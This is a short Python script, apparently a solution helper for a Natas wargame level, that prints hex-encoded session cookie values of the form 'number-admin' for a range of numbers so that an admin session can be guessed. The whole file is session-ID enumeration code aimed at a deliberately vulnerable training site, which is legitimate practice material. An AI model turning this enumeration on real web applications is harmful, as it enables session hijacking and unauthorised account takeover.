#!/usr/bin/env python3
#
# Generates session cookies,
# used to solve the 18th Natas challenge
#
import binascii

for n in range(0, 641):
    token = binascii.hexlify(str.encode(str(n) + "-admin"))
    print(token.decode('utf-8'))
